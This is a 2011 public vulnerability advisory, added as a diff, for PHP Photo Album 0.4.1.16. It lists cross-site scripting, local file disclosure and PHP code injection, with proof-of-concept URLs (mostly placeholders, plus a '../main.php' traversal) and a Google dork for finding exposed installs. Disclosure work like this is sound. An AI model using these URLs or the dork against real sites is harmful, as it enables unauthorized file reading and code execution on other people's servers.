@@ -1,0 +1,102 @@
+----------------------------------------------------------------
+PHP Photo Album <= (0.4.1.16) Multiple Disclosure Vulnerabilities
+----------------------------------------------------------------
+
+# Exploit Title: PHP Photo Album <= (0.4.1.16) Multiple Disclosure
+Vulnerabilities
+# Google Dork: inurl:main.php?cmd=imageview&var1=
+# Application Name: [PHP Photo Album]
+# Date: 2011-10-29
+# Author: BHG Security Center
+# Home: Http://black-hg.org
+# Software Link: [ http://www.phpalbum.net/dw ]
+# Version: [ 0.4.1.16 ]
+# Impact : [ High ]
+# Tested on: [linux+apache]
+# CVE : Webapps
+# Finder(s):
+    - Net.Edit0r (Net.edit0r [at] att [dot] net)
+    - tHe.k!ll3r (Attack-bhg [at] att [dot] net)
+    - 2MzRp  (mzrp2 [at] Yahoo [dot] com )
+
+# Description: : Given the vulnerability you want to read files on the
+server must have access
+
++-----------------------+
+| Cross Site scripting  |
++-----------------------+
+
+The vulnerable code is located in /www/main.php?cmd=imageview&var1=[XSS]
+
+
+Proof of Concept:
+-----------------
+
+
+~ PoC : http://localhost/phpAlbum/main.php?cmd=imageview&var1=[XSS]
+
+~ Poc 2
+
+http://localhost/phpAlbum/main.php?cmd=albumnew&keyword=[XSS]
+
++----------------------+
+| Download/Source Code |
++----------------------+
+
+The vulnerable code is located in /www/main.php
+
+Proof of Concept:
+-----------------
+
+~ PoC : http://localhost/phpAlbum/main.php?cmd=image&var1=[LFD]
+
+~ PoC : http://localhost/phpAlbum/main.php?cmd=image&var1=../main.php
+
+~ PoC 2 : http://localhost/main.php?cmd=themeimage&var1=[LFD]
+
+# Important Notes:
+
+Php files from source to display (Veiw Page Source) your browser
+
+
++--------------------+
+| PHP Code Injection |
++--------------------+
+
+The vulnerable code is located in /www/main.php
+
+124 :       Array
+125 :       (
+126 :              [0] => cmd=phpinfo
+127 :        )
+
+
+Proof of Concept:
+-----------------
+
+~ PoC : http://localhost/phpAlbum/main.php?cmd=phpinfo
+
+~ PoC : http://localhost/demo3/main.php?keyword=hack&cmd=phpinfo
+
+~ PoC 2 http://localhost/main.php?cmd=setquality&var1=[PHP Code Injection]
+
+
+[-] Disclosure timeline:
+
+[12/10/2011] - Vulnerabilities discovered
+[14/10/2011] - Others vulnerabilities discovered
+[15/10/2011] - Issues reported to http://black-hg.org
+[29/10/2011] - Public disclosure
+
+
+# Greets To :
+
+Net.Edit0r ~ A.Cr0x ~ 3H34N ~ 4m!n ~ Cyrus ~ tHe.k!ll3r ~ 2MzRp ~
+ArYaIeIrAn ~ Mikili
+
+cmaxx ~ G3n3Rall ~ Mr.XHat ~  M4hd1 ~ Cru3l.b0y ~ HUrr!c4nE ~ r3v0lter
+~ NoL1m1t
+
+s3cure.p0rt ~ THANKS TO ALL Iranian HackerZ  ./Persian Gulf
+
+===========================================[End]=============================================
